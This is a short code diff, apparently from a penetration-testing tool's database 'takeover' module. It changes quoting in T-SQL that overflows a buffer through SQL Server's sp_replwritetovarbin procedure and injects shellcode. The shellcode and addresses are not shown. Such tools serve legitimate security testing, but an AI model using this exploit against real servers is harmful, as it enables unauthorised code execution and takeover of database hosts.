@@ -77,7 +77,7 @@ class Takeover(GenericTakeover):
         @counter INT
         SET @buf = '
         DECLARE @retcode int, @end_offset int, @vb_buffer varbinary, @vb_bufferlen int
-        EXEC master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''
+        EXEC master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,"""
         SET @val = CHAR(0x41)
         SET @counter = 0
         WHILE @counter < 3320
@@ -133,7 +133,7 @@ class Takeover(GenericTakeover):
           END
           SET @buf = @buf + @val
         END
-        SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''
+        SET @buf = @buf + """,''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41"""
         EXEC master..sp_executesql @buf
         """ % (addrs[0], addrs[1], addrs[2], addrs[3], addrs[4], addrs[5], addrs[6], addrs[7], shellcodeChar)
 
